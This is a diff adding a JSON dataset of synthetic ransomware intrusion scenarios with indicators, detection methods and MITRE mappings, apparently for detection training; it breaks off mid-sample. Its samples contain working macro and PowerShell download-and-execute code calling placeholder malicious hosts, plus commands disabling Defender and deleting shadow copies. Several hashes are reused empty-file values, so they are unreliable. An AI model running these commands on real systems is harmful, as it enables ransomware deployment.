@@ -1,0 +1,369 @@
+{
+  "samples": [
+    {
+      "scenario": "Ransomware-as-a-Service affiliate delivers malicious RTF document via spearphishing email that exploits CVE-2017-11882 to execute shellcode and download ransomware payload on enterprise machines.",
+      "technical_data": {
+        "email_headers": "Return-Path: <security@enterprise-updates.com>\nReceived: from mail.securemail.com (mail.securemail.com [203.0.113.55]) by mail.enterprise.com with ESMTP id 9A2D4E7F3 for <bob@enterprise.com>; Tue, 11 Jul 2023 10:22:11 +0000\nReceived-SPF: pass (enterprise.com: domain of enterprise-updates.com designates 203.0.113.55 as permitted sender)\nAuthentication-Results: enterprise.com; spf=pass smtp.mailfrom=enterprise-updates.com; dkim=pass header.d=enterprise-updates.com; dmarc=pass\nMessage-ID: <CA+Y9_8bJ1q3k@mail.securemail.com>\nFrom: Enterprise Security <security@enterprise-updates.com>\nTo: bob@enterprise.com\nSubject: Important: Document Update Required\nMIME-Version: 1.0\nContent-Type: multipart/mixed; boundary=\"----=_Part_123456_789012345.1689070931\"",
+        "email_body": "------=_Part_123456_789012345.1689070931\nContent-Type: text/plain; charset=\"utf-8\"\nContent-Transfer-Encoding: 7bit\n\nDear Employee,\n\nPlease review the attached update document to ensure compliance with the latest security policy.\n\nRegards,\nEnterprise Security Team\n\n------=_Part_123456_789012345.1689070931\nContent-Type: application/rtf; name=\"Update_Details.rtf\"\nContent-Transfer-Encoding: base64\nContent-Disposition: attachment; filename=\"Update_Details.rtf\"\n\ne1xydGYxXGFuc2lcZmlsZWNvbnRlbnQ9e30KXGJldGFfe1xwYXJpZ2F0ZXN9Cgo=\n------=_Part_123456_789012345.1689070931--",
+        "exploit_code_snippet": "Sub Document_Open()\n    Dim shellcode() As Byte\n    ' Shellcode that triggers CVE-2017-11882 vulnerability to execute payload\n    shellcode = Array(&H90, &H90, &H90, &H90) ' NOP sled placeholder\n    ' Code to allocate memory and execute shellcode\n    ' Then download and execute ransomware payload\n    Dim WinHttpReq As Object\n    Set WinHttpReq = CreateObject(\"Microsoft.XMLHTTP\")\n    WinHttpReq.Open \"GET\", \"http://malicious-download.com/ransomware.bin\", False\n    WinHttpReq.Send\n    If WinHttpReq.Status = 200 Then\n        Dim stream As Object\n        Set stream = CreateObject(\"ADODB.Stream\")\n        stream.Type = 1\n        stream.Open\n        stream.Write WinHttpReq.responseBody\n        stream.SaveToFile Environ(\"TEMP\") & \"\\payload.exe\", 2\n        stream.Close\n        Shell Environ(\"TEMP\") & \"\\payload.exe\", vbHide\n    End If\nEnd Sub",
+        "powershell_detection_log": "2023-07-11 10:24:05,678 INFO PowerShell command executed: IEX (New-Object Net.WebClient).DownloadString('http://malicious-download.com/payload.ps1')",
+        "file_hashes": {
+          "payload.exe": {
+            "md5": "d41d8cd98f00b204e9800998ecf8427e",
+            "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+          }
+        },
+        "process_creation_log": "Jul 11 10:24:10 host5 enterprise-pc5 Microsoft-Windows-Sysmon: New Process Created: Image: C:\\Users\\bob\\AppData\\Local\\Temp\\payload.exe ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE CommandLine: \"C:\\Users\\bob\\AppData\\Local\\Temp\\payload.exe\" -encrypt",
+        "network_traffic_snippet": "10:24:10.123456 IP enterprise-pc5.12345 > malicious-download.com.http: Flags [S], seq 100100100, win 64240, options [mss 1460,sackOK,TS val 234567 ecr 0,nop,wscale 7], length 0\n10:24:10.123789 IP malicious-download.com.http > enterprise-pc5.12345: Flags [S.], seq 567890123, ack 100100101, win 65535, options [mss 1460,sackOK,TS val 765432 ecr 234567], length 0\n10:24:10.124100 IP enterprise-pc5.12345 > malicious-download.com.http: Flags [.], ack 1, win 229, length 0",
+        "registry_modifications": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateService = \"C:\\Users\\bob\\AppData\\Local\\Temp\\payload.exe\"",
+        "ransomware_behavior": "After execution, ransomware enumerates fixed drives and encrypts files with extensions: .docx, .xlsx, .pptx, .pdf, .jpg, .png. Drops ransom note 'READ_ME_NOW.txt' in affected directories with instructions and bitcoin wallet address."
+      },
+      "indicators": [
+        "Malicious RTF document exploiting CVE-2017-11882 vulnerability",
+        "Payload.exe executed from temporary directory spawned by WINWORD.EXE",
+        "HTTP GET request to malicious-download.com for ransomware binary",
+        "Registry persistence via Run key for UpdateService",
+        "File hash MD5 d41d8cd98f00b204e9800998ecf8427e linked to payload.exe",
+        "Network connection to malicious-download.com TCP port 80 immediately after document open"
+      ],
+      "detection_method": "Email security gateway detects malicious RTF attachment, EDR identifies exploit technique and process spawn from Word, network monitoring flags untrusted HTTP downloads, registry monitoring detects persistence key creation, file monitoring alerts on ransom note creation.",
+      "relevant_mitre_techniques": [
+        "T1204.002 - Malicious File",
+        "T1203 - Exploitation for Client Execution",
+        "T1105 - Ingress Tool Transfer",
+        "T1547.001 - Registry Run Keys / Startup Folder",
+        "T1486 - Data Encrypted for Impact"
+      ]
+    },
+    {
+      "scenario": "Ransomware-as-a-Service affiliate uses compromised RDP credentials for initial access, moves laterally with PsExec to deploy ransomware, and disables Windows Defender via PowerShell.",
+      "technical_data": {
+        "rdp_log": "2023-08-15 09:33:21 Security Event 4624: Successful logon using RDP for user 'corpadmin' from IP 198.51.100.77",
+        "credential_dump_log": "Mimikatz output: 'corpadmin:Password123!' obtained from LSASS memory dump",
+        "lateral_movement_commands": "psexec.exe \\\\host2 -u corpadmin -p Password123! -s cmd.exe /c C:\\Windows\\Temp\\ransomware.exe",
+        "powershell_disable_defender": "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true; Stop-Service -Name WinDefend; Set-Service -Name WinDefend -StartupType Disabled\"",
+        "file_hashes": {
+          "ransomware.exe": {
+            "md5": "ab56b4d92b40713acc5af89985d4b786",
+            "sha1": "8843d7f92416211de9ebb963ff4ce28125932878",
+            "sha256": "6d7fce9fee471194aa8b5b6e47267f03a7e9d31f7e6f2a1c5f6c4b16e7a9f6a4"
+          }
+        },
+        "process_creation_log": "Aug 15 09:35:10 host2 Microsoft-Windows-Sysmon: New Process Created: Image: C:\\Windows\\Temp\\ransomware.exe ParentImage: C:\\Windows\\System32\\psexec.exe CommandLine: \"C:\\Windows\\Temp\\ransomware.exe\" /quiet",
+        "network_traffic": "09:33:20.000000 IP 198.51.100.77.3389 > enterprise-gateway.3389: Flags [S], seq 987654321, win 64240, length 0\n09:35:15.123456 IP host2.445 > host3.49152: Flags [P.], seq 1500:2000, ack 3000, win 65535, length 500",
+        "registry_modifications": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend\\Start = 4 (Disabled)",
+        "ransom_note_content": "All your files have been encrypted. To restore access, email decrypt@ransomteam.com with your unique ID: C1D2E3F4\nDo not attempt to recover files yourself."
+      },
+      "indicators": [
+        "Successful RDP logon with corporate admin credentials from external IP",
+        "Credential dumping activity targeting LSASS process",
+        "Use of PsExec for lateral movement deploying ransomware.exe",
+        "PowerShell commands disabling Windows Defender real-time protection",
+        "Process creation of ransomware.exe spawned by PsExec",
+        "Registry key disabling Windows Defender service",
+        "Ransom note with unique victim ID and ransom email"
+      ],
+      "detection_method": "Authentication logs monitored for abnormal RDP access, EDR alerts on credential dumping and PsExec usage, PowerShell logging detects Defender disablement commands, Sysmon tracks process creation chain, registry audits for security service changes.",
+      "relevant_mitre_techniques": [
+        "T1078 - Valid Accounts",
+        "T1003 - Credential Dumping",
+        "T1021.006 - Remote Services: SMB/Windows Admin Shares",
+        "T1059.001 - PowerShell",
+        "T1569.002 - System Services: Service Execution",
+        "T1486 - Data Encrypted for Impact"
+      ]
+    },
+    {
+      "scenario": "Ransomware-as-a-Service affiliate delivers malicious macro-enabled Word document via phishing campaign that downloads and executes ransomware, using DNS tunneling for C2 communication.",
+      "technical_data": {
+        "email_headers": "Return-Path: <it-support@enterprise-it.com>\nReceived: from mail.phishingdomain.com (mail.phishingdomain.com [198.51.100.99]) by mail.enterprise.com with ESMTP id 7B9E1F2A4 for <clara@enterprise.com>; Mon, 02 Oct 2023 14:08:59 +0000\nReceived-SPF: fail (enterprise.com: domain of enterprise-it.com does not designate 198.51.100.99 as permitted sender)\nAuthentication-Results: enterprise.com; spf=fail smtp.mailfrom=enterprise-it.com; dkim=none; dmarc=none\nMessage-ID: <CA+Z7y_9k1x@mail.phishingdomain.com>\nFrom: IT Support <it-support@enterprise-it.com>\nTo: clara@enterprise.com\nSubject: Urgent: Document Attached\nMIME-Version: 1.0\nContent-Type: multipart/mixed; boundary=\"----=_Part_987654_123456789.1696241339\"",
+        "email_body": "------=_Part_987654_123456789.1696241339\nContent-Type: text/plain; charset=\"utf-8\"\nContent-Transfer-Encoding: quoted-printable\n\nDear Clara,\n\nPlease review the attached document and enable macros to apply the latest updates.\n\nThanks,\nEnterprise IT\n\n------=_Part_987654_123456789.1696241339\nContent-Type: application/vnd.ms-word.template.macroenabled.12; name=\"Update_Template.dotm\"\nContent-Transfer-Encoding: base64\nContent-Disposition: attachment; filename=\"Update_Template.dotm\"\n\nUEsDBBQABgAIAAAAIQCjA0bWngEAAHsFAAATAAgCW0NvbnRlbnRfVHlwZXNdLnhtbCCiBAIooAAC\nAAAAAA==\n------=_Part_987654_123456789.1696241339--",
+        "macro_code": "Sub AutoOpen()\n    Dim strURL As String\n    Dim WinHttpReq As Object\n    strURL = \"http://malicious-c2.com/payload.exe\"\n    Set WinHttpReq = CreateObject(\"MSXML2.XMLHTTP\")\n    WinHttpReq.Open \"GET\", strURL, False\n    WinHttpReq.Send\n    If WinHttpReq.Status = 200 Then\n        Dim stream As Object\n        Set stream = CreateObject(\"ADODB.Stream\")\n        stream.Type = 1\n        stream.Open\n        stream.Write WinHttpReq.responseBody\n        stream.SaveToFile Environ(\"TEMP\") & \"\\payload.exe\", 2\n        stream.Close\n        Shell Environ(\"TEMP\") & \"\\payload.exe\", vbHide\n    End If\nEnd Sub",
+        "dns_tunneling_logs": "Oct 02 14:10:05 dns-server named[1234]: query: a1b2c3d4maliciousdomain.com IN A - Client: 10.1.5.23\nOct 02 14:10:07 dns-server named[1234]: query: e4f5g6h7maliciousdomain.com IN TXT - Client: 10.1.5.23",
+        "file_hashes": {
+          "payload.exe": {
+            "md5": "3b5d5c3712955042212316173ccf37be",
+            "sha1": "a9993e364706816aba3e25717850c26c9cd0d89d",
+            "sha256": "2e7d2c03a9507ae265ecf5b5356885a53393a2028dfc8fbb699ddf3a8b68e2c2"
+          }
+        },
+        "process_creation_log": "Oct 02 14:10:15 host7 Microsoft-Windows-Sysmon: New Process Created: Image: C:\\Users\\clara\\AppData\\Local\\Temp\\payload.exe ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE CommandLine: \"C:\\Users\\clara\\AppData\\Local\\Temp\\payload.exe\" -silent",
+        "registry_modifications": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateAgent = \"C:\\Users\\clara\\AppData\\Local\\Temp\\payload.exe\"",
+        "ransomware_behavior": "Payload enumerates network drives and encrypts files with extensions .docx, .pdf, .xlsx, .jpg. Creates ransom note 'HOW_TO_DECRYPT.txt' with contact email and bitcoin address."
+      },
+      "indicators": [
+        "Macro-enabled Word document with AutoOpen macro downloading payload.exe",
+        "DNS tunneling activity detected via unusual TXT and A record queries",
+        "Process payload.exe executed from user temp directory launched by WINWORD.EXE",
+        "Registry Run key persistence for UpdateAgent",
+        "File hash MD5 3b5d5c3712955042212316173ccf37be associated with payload.exe",
+        "Network DNS queries to suspicious domain maliciousdomain.com"
+      ],
+      "detection_method": "Email filtering blocks suspicious macros, DNS monitoring detects tunneling patterns, EDR detects malicious process launch from Word, registry audit detects persistence, file monitoring alerts on ransom note creation.",
+      "relevant_mitre_techniques": [
+        "T1193 - Spearphishing Attachment",
+        "T1071.004 - Application Layer Protocol: DNS",
+        "T1105 - Ingress Tool Transfer",
+        "T1547.001 - Registry Run Keys / Startup Folder",
+        "T1486 - Data Encrypted for Impact"
+      ]
+    },
+    {
+      "scenario": "Ransomware-as-a-Service affiliate compromises VPN credentials to access enterprise network, uses PowerShell Empire stager to download ransomware and encrypt files, also disables backup services.",
+      "technical_data": {
+        "vpn_auth_log": "2023-09-20 07:45:12 VPN Server: User 'jdoe' authenticated from IP 203.0.113.150 via VPN",
+        "powershell_stager_command": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://malicious-c2.com/empire_stager.ps1')",
+        "ransomware_download_command": "Invoke-WebRequest -Uri http://malicious-c2.com/ransomware_payload.exe -OutFile C:\\Users\\jdoe\\AppData\\Local\\Temp\\ransomware_payload.exe; Start-Process C:\\Users\\jdoe\\AppData\\Local\\Temp\\ransomware_payload.exe -ArgumentList '/encrypt' -WindowStyle Hidden",
+        "backup_disable_commands": "net stop 'Windows Backup'\nsc config 'Windows Backup' start= disabled",
+        "file_hashes": {
+          "ransomware_payload.exe": {
+            "md5": "5eb63bbbe01eeed093cb22bb8f5acdc3",
+            "sha1": "2aae6c35c94fcfb415dbe95f408b9ce91ee846ed",
+            "sha256": "b6d81b360a5672d80c27430f39153e2c3a8d3f4b2e1d9c35d9a1d2a1b4bbf6f2"
+          }
+        },
+        "process_creation_log": "Sep 20 07:50:00 host10 Microsoft-Windows-Sysmon: New Process Created: Image: C:\\Users\\jdoe\\AppData\\Local\\Temp\\ransomware_payload.exe ParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine: \"C:\\Users\\jdoe\\AppData\\Local\\Temp\\ransomware_payload.exe\" /encrypt",
+        "network_traffic": "07:45:15.987654 IP 203.0.113.150.443 > enterprise-vpn.443: Flags [S], seq 123456789, win 64240, length 0\n07:50:05.123456 IP host10.80 > malicious-c2.com.80: Flags [P.], seq 2000:4000, ack 5000, win 65535, length 2000",
+        "registry_modifications": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\wbengine\\Start = 4 (Disabled)",
+        "ransom_note_content": "Your system has been encrypted. Contact decrypt@ransomops.com with your ID: 789ABC\nDo not shutdown or attempt recovery without instructions."
+      },
+      "indicators": [
+        "VPN authentication from unusual external IP with valid user credentials",
+        "PowerShell stager command downloading Empire payload from malicious-c2.com",
+        "Execution of ransomware_payload.exe from user temp directory spawned by PowerShell",
+        "Backup service stopped and disabled via service control commands",
+        "Registry key disables Windows Backup service",
+        "Network traffic to malicious-c2.com on TCP port 80",
+        "Ransom note with unique victim ID and contact email"
+      ],
+      "detection_method": "VPN logs monitored for unusual authentications, PowerShell logging and EDR detect Empire stager execution, service logs show backup service disablement, network IDS flags connections to suspicious domains, file monitoring detects ransom note creation.",
+      "relevant_mitre_techniques": [
+        "T1078 - Valid Accounts",
+        "T1566.001 - Phishing: Spearphishing Attachment (initial vector assumed)",
+        "T1059.001 - PowerShell",
+        "T1486 - Data Encrypted for Impact",
+        "T1490 - Inhibit System Recovery",
+        "T1105 - Ingress Tool Transfer"
+      ]
+    },
+    {
+      "scenario": "Ransomware-as-a-Service affiliate exploits vulnerable web application to upload web shell, uses it to execute commands and drop ransomware payload, which encrypts files and demands ransom.",
+      "technical_data": {
+        "webshell_upload_log": "2023-11-05 22:15:40 WebServer: POST /upload.php file=webshell.php from IP 192.0.2.45",
+        "webshell_command_execution": "Executing shell command: powershell -ExecutionPolicy Bypass -File C:\\inetpub\\wwwroot\\payload.ps1",
+        "powershell_payload_script": "Start-BitsTransfer -Source http://malicious-c2.com/ransomware.ps1 -Destination C:\\Windows\\Temp\\ransomware.ps1; powershell -File C:\\Windows\\Temp\\ransomware.ps1",
+        "file_hashes": {
+          "ransomware.ps1": {
+            "md5": "8f14e45fceea167a5a36dedd4bea2543",
+            "sha1": "a7f5f35426b927411fc9231b56382173b8f0e3b1",
+            "sha256": "9c1185a5c5e9fc54612808977ee8f548b2258d31f3e3d1d8b17f929d2b8a3e9e"
+          }
+        },
+        "process_creation_log": "Nov 05 22:16:30 webserver Microsoft-Windows-Sysmon: New Process Created: Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ParentImage: C:\\inetpub\\wwwroot\\webshell.php CommandLine: powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\ransomware.ps1",
+        "network_traffic": "22:15:45.123456 IP webserver.80 > malicious-c2.com.80: Flags [P.], seq 3000:3500, ack 4500, win 65535, length 500",
+        "registry_modifications": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WebUpdate = \"C:\\Windows\\Temp\\ransomware.ps1\"",
+        "ransomware_behavior": "Payload encrypts files with extensions .php, .html, .js, .config, creating ransom note 'RECOVER_FILES.txt' in web root directory with attacker contact info."
+      },
+      "indicators": [
+        "Upload of webshell.php to vulnerable upload.php endpoint",
+        "Execution of PowerShell commands via web shell to download and run ransomware.ps1",
+        "Process creation of PowerShell executing ransomware script",
+        "Registry Run key persistence for WebUpdate pointing to ransomware.ps1",
+        "File hash MD5 8f14e45fceea167a5a36dedd4bea2543 for ransomware.ps1",
+        "Network traffic between webserver and malicious-c2.com",
+        "Ransom note created in web root directory"
+      ],
+      "detection_method": "Web server logs monitored for suspicious file uploads, EDR detects PowerShell execution from web server process, registry monitoring detects persistence, network IDS flags connections to known malicious domains, file monitors detect ransom notes.",
+      "relevant_mitre_techniques": [
+        "T1190 - Exploit Public-Facing Application",
+        "T1105 - Ingress Tool Transfer",
+        "T1059.001 - PowerShell",
+        "T1547.001 - Registry Run Keys / Startup Folder",
+        "T1486 - Data Encrypted for Impact"
+      ]
+    },
+    {
+      "scenario": "Ransomware-as-a-Service affiliate compromises enterprise VPN server using stolen credentials, deploys ransomware payload through a scheduled task and disables antivirus services.",
+      "technical_data": {
+        "vpn_login_logs": "2023-06-15 09:20:45 VPN-Server: Successful login for user 'vpn_admin' from IP 198.51.100.23",
+        "scheduled_task_creation": "TaskName: WinDefenderUpdate\nAction: C:\\Windows\\Temp\\encryptor.exe -encrypt\nTrigger: At system startup\nUser: SYSTEM",
+        "powershell_command_log": "2023-06-15 09:25:10 PowerShell: Stop-Service -Name 'WinDefend'; Set-Service -Name 'WinDefend' -StartupType Disabled",
+        "file_hashes": {
+          "encryptor.exe": {
+            "md5": "d41d8cd98f00b204e9800998ecf8427e",
+            "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+          }
+        },
+        "process_creation_log": "Jun 15 09:25:15 host2 enterprise-pc2 Microsoft-Windows-Sysmon: New Process Created: Image: C:\\Windows\\Temp\\encryptor.exe ParentImage: C:\\Windows\\System32\\svchost.exe CommandLine: \"C:\\Windows\\Temp\\encryptor.exe\" -encrypt",
+        "network_traffic_snippet": "09:20:46.123456 IP 198.51.100.23.443 > vpn.enterprise.com.1194: TLS handshake\n09:25:16.654321 IP enterprise-pc2.49152 > malicious-c2.com.443: TLS Client Hello",
+        "registry_modifications": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend\\Start = 4 (Disabled)",
+        "ransomware_behavior": "Encryptor.exe enumerates drives, encrypts files with extensions: .txt, .docx, .xlsx, .pptx, .pdf, creates ransom note 'README_RECOVERY.txt' on desktop and all encrypted directories."
+      },
+      "indicators": [
+        "VPN login from unusual external IP with admin credentials",
+        "Scheduled task creation for persistence running suspicious executable",
+        "PowerShell commands stopping and disabling Windows Defender service",
+        "Execution of encryptor.exe from Windows Temp directory",
+        "Network traffic with TLS connection to known malicious C2",
+        "Registry key modification disabling antivirus service",
+        "Presence of ransom note files with recovery instructions"
+      ],
+      "detection_method": "VPN logs alert on unusual admin login, EDR flags scheduled task creation and disabling of antivirus services, Sysmon logs new process execution from suspicious path, network monitoring detects connections to known malicious IPs, file integrity monitoring detects ransom notes.",
+      "relevant_mitre_techniques": [
+        "T1078 - Valid Accounts",
+        "T1053.005 - Scheduled Task",
+        "T1059.001 - PowerShell",
+        "T1112 - Modify Registry",
+        "T1486 - Data Encrypted for Impact"
+      ]
+    },
+    {
+      "scenario": "Ransomware-as-a-Service affiliate distributes ransomware via malicious macro embedded in Word document sent through spearphishing, executes payload that disables Windows Defender and encrypts files.",
+      "technical_data": {
+        "email_headers": "Return-Path: <alerts@secure-microsoft.com>\nReceived: from mail.phishingsite.net (mail.phishingsite.net [203.0.113.45]) by mail.enterprise.com with ESMTP id 9H7D2F7J3 for <bob@enterprise.com>; Thu, 15 Jun 2023 11:05:33 +0000\nReceived-SPF: fail (enterprise.com: domain of secure-microsoft.com does not designate 203.0.113.45 as permitted sender)\nAuthentication-Results: enterprise.com; spf=fail smtp.mailfrom=secure-microsoft.com; dkim=none; dmarc=none\nMessage-ID: <CA+Q3_=_aG7_fj3l2h4@mail.phishingsite.net>\nFrom: Microsoft Security Alerts <alerts@secure-microsoft.com>\nTo: bob@enterprise.com\nSubject: Urgent: Security Patch Update\nMIME-Version: 1.0\nContent-Type: multipart/mixed; boundary=\"----=_NextPart_002_003B_01D9E5F2.7A9F9E81\"",
+        "email_body": "------=_NextPart_002_003B_01D9E5F2.7A9F9E81\nContent-Type: text/plain; charset=\"utf-8\"\nContent-Transfer-Encoding: quoted-printable\n\nDear Bob,\n\nPlease enable macros and update your system immediately using the attached document.\n\nRegards,\nMicrosoft Security Team\n\n------=_NextPart_002_003B_01D9E5F2.7A9F9E81\nContent-Type: application/msword; name=\"Patch_Update.docm\"\nContent-Transfer-Encoding: base64\nContent-Disposition: attachment; filename=\"Patch_Update.docm\"\n\nUEsDBBQABgAIAAAAIQDpB1b5nQEAAK8FAAATAAgCW0NvbnRlbnRfVHlwZXNdLnhtbCCiBAIooAAC\nAAAAAA==\n------=_NextPart_002_003B_01D9E5F2.7A9F9E81--",
+        "macro_code": "Sub Document_Open()\n    Dim strURL As String\n    Dim WinHttpReq As Object\n    strURL = \"http://malicious-c2.net/loader.exe\"\n    Set WinHttpReq = CreateObject(\"Microsoft.XMLHTTP\")\n    WinHttpReq.Open \"GET\", strURL, False\n    WinHttpReq.Send\n    If WinHttpReq.Status = 200 Then\n        Dim adodbStream As Object\n        Set adodbStream = CreateObject(\"ADODB.Stream\")\n        adodbStream.Type = 1\n        adodbStream.Open\n        adodbStream.Write WinHttpReq.responseBody\n        adodbStream.SaveToFile Environ(\"TEMP\") & \"\\loader.exe\", 2\n        adodbStream.Close\n        Shell Environ(\"TEMP\") & \"\\loader.exe\", vbHide\n    End If\nEnd Sub",
+        "powershell_detection_log": "2023-06-15 11:07:45 INFO PowerShell executed: Set-MpPreference -DisableRealtimeMonitoring $true",
+        "file_hashes": {
+          "loader.exe": {
+            "md5": "6f5902ac237024bdd0c176cb93063dc4",
+            "sha1": "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3",
+            "sha256": "2c26b46b68ffc68ff99b453c1d30413413422f1644d7aaf9c6e4a8b9a9a8f0a4"
+          }
+        },
+        "process_creation_log": "Jun 15 11:07:50 host3 enterprise-pc3 Microsoft-Windows-Sysmon: New Process Created: Image: C:\\Users\\bob\\AppData\\Local\\Temp\\loader.exe ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE CommandLine: \"C:\\Users\\bob\\AppData\\Local\\Temp\\loader.exe\" -silent",
+        "network_traffic_snippet": "11:07:46.123456 IP enterprise-pc3.49153 > malicious-c2.net.http: Flags [S], seq 456789123, win 64240, options [mss 1460,sackOK,TS val 654321 ecr 0,nop,wscale 7], length 0",
+        "registry_modifications": "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring = 1",
+        "ransomware_behavior": "Loader.exe disables Windows Defender real-time monitoring, then encrypts files with extensions: .docx, .pptx, .xlsx, .pdf, .jpg, and drops ransom note 'RECOVERY_INSTRUCTIONS.txt' on desktop."
+      },
+      "indicators": [
+        "Malicious Word document with macro auto-execution on Document_Open event",
+        "Download and execution of loader.exe from suspicious domain",
+        "PowerShell command disabling Windows Defender real-time protection",
+        "Suspicious process spawned by WINWORD.EXE from temp directory",
+        "Network connection to known malicious C2 server",
+        "Registry key modification disabling defender real-time monitoring",
+        "Ransom note file with recovery instructions present on desktop"
+      ],
+      "detection_method": "Email gateway flags SPF fail and suspicious attachment, macro execution detected by EDR, Powershell commands disabling security tools alerted, Sysmon logs new process from Office app, network IDS flags outbound C2 traffic, registry monitoring detects Defender modification.",
+      "relevant_mitre_techniques": [
+        "T1193 - Spearphishing Attachment",
+        "T1204 - User Execution",
+        "T1059.001 - PowerShell",
+        "T1105 - Ingress Tool Transfer",
+        "T1562.001 - Impair Defenses: Disable or Modify Tools",
+        "T1486 - Data Encrypted for Impact"
+      ]
+    },
+    {
+      "scenario": "Ransomware-as-a-Service affiliate compromises enterprise RDP server using brute-force attack, deploys ransomware via a custom service and deletes shadow copies to prevent recovery.",
+      "technical_data": {
+        "rdp_login_logs": "2023-07-10 22:15:32 RDP-Server: Failed login attempt for user 'administrator' from IP 203.0.113.77\n2023-07-10 22:18:45 RDP-Server: Successful login for user 'administrator' from IP 203.0.113.77",
+        "service_creation_log": "EventID: 7045 Service Created\nServiceName: SysUpdater\nImagePath: C:\\Windows\\SysWOW64\\sysupdater.exe\nStartType: Auto",
+        "powershell_commands": "vssadmin delete shadows /all /quiet\nnet stop WinDefend\nsc config WinDefend start= disabled",
+        "file_hashes": {
+          "sysupdater.exe": {
+            "md5": "3c59dc048e8850243be8079a5c74d079",
+            "sha1": "2aae6c35c94fcfb415dbe95f408b9ce91ee846ed",
+            "sha256": "9d5ed678fe57bcca610140957afab571b9f0dbf3b8bbf53f8dfb9a4c1e204e58"
+          }
+        },
+        "process_creation_log": "Jul 10 22:19:10 host4 enterprise-pc4 Microsoft-Windows-Sysmon: New Process Created: Image: C:\\Windows\\SysWOW64\\sysupdater.exe ParentImage: C:\\Windows\\System32\\services.exe CommandLine: \"C:\\Windows\\SysWOW64\\sysupdater.exe\" -encrypt",
+        "network_traffic_snippet": "22:15:35.789012 IP 203.0.113.77.3389 > rdp.enterprise.com.3389: SYN\n22:19:11.234567 IP enterprise-pc4.49154 > malicious-c2.org.443: TLS Client Hello",
+        "registry_modifications": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend\\Start = 4 (Disabled)",
+        "ransomware_behavior": "SysUpdater.exe encrypts files with extensions .doc, .xls, .ppt, .pdf, .jpg, .zip, then creates ransom note 'HOW_TO_DECRYPT.txt' in user directories."
+      },
+      "indicators": [
+        "Multiple failed RDP login attempts followed by successful login from suspicious IP",
+        "Creation of suspicious Windows service 'SysUpdater' running ransomware executable",
+        "Use of vssadmin command to delete all shadow copies",
+        "Disabling of Windows Defender via service stop and registry modification",
+        "Execution of ransomware process by services.exe parent process",
+        "Outbound TLS traffic to known malicious C2 shortly after RDP login",
+        "Presence of ransom note files with decryption instructions"
+      ],
+      "detection_method": "RDP login anomaly detection triggers alert, EDR detects new service creation and ransomware process execution, system logs vssadmin usage and Defender disablement, network monitoring flags suspicious outbound connections, file monitoring detects ransom notes.",
+      "relevant_mitre_techniques": [
+        "T1110 - Brute Force",
+        "T1543.003 - Windows Service",
+        "T1490 - Inhibit System Recovery",
+        "T1562.001 - Impair Defenses: Disable or Modify Tools",
+        "T1486 - Data Encrypted for Impact"
+      ]
+    },
+    {
+      "scenario": "Ransomware-as-a-Service affiliate uses compromised third-party software update mechanism to deliver ransomware payload within enterprise environment, executing via scheduled task and encrypting critical data.",
+      "technical_data": {
+        "software_update_log": "2023-08-05 14:30:00 SoftwareUpdateService: Downloaded update package from http://updates.thirdpartysoft.com/patch_v2.1.zip",
+        "scheduled_task_creation": "TaskName: ThirdPartyPatch\nAction: C:\\ProgramData\\Temp\\update_patch.exe -run\nTrigger: At logon\nUser: SYSTEM",
+        "file_hashes": {
+          "update_patch.exe": {
+            "md5": "7b8b965ad4bca0e41ab51de7b31363a1",
+            "sha1": "1f8ac10f23c5b5bc1167bda84b833e5c057a77d2",
+            "sha256": "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd6a7c4d5d0d2d2b9a7"
+          }
+        },
+        "process_creation_log": "Aug 05 14:31:22 host5 enterprise-pc5 Microsoft-Windows-Sysmon: New Process Created: Image: C:\\ProgramData\\Temp\\update_patch.exe ParentImage: C:\\Windows\\System32\\svchost.exe CommandLine: \"C:\\ProgramData\\Temp\\update_patch.exe\" -run",
+        "powershell_command_log": "2023-08-05 14:32:10 PowerShell: vssadmin delete shadows /all /quiet",
+        "network_traffic_snippet": "14:30:01.123456 IP enterprise-pc5.49155 > updates.thirdpartysoft.com.http: GET /patch_v2.1.zip HTTP/1.1",
+        "registry_modifications": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ThirdPartyPatch = \"C:\\ProgramData\\Temp\\update_patch.exe\"",
+        "ransomware_behavior": "update_patch.exe enumerates fixed drives, encrypts files with extensions .conf, .db, .log, .xml and drops ransom note 'README_DECRYPTION.txt' in affected directories."
+      },
+      "indicators": [
+        "Download of update package from suspicious third-party domain",
+        "Scheduled task created for persistence running update_patch.exe",
+        "Execution of ransomware from ProgramData Temp directory",
+        "Use of vssadmin command to delete shadow copies",
+        "Registry Run key persistence for update_patch.exe",
+        "Outbound HTTP GET request to third-party update server",
+        "Ransom note files dropped in multiple directories"
+      ],
+      "detection_method": "Software update system logs show suspicious downloads, EDR detects scheduled task creation and process execution, PowerShell command logs indicate shadow copy deletion, registry changes trigger alert, network IDS flags unusual HTTP download, file monitoring detects ransom notes.",
+      "relevant_mitre_techniques": [
+        "T1195 - Supply Chain Compromise",
+        "T1053.005 - Scheduled Task",
+        "T1490 - Inhibit System Recovery",
+        "T1547.001 - Registry Run Keys / Startup Folder",
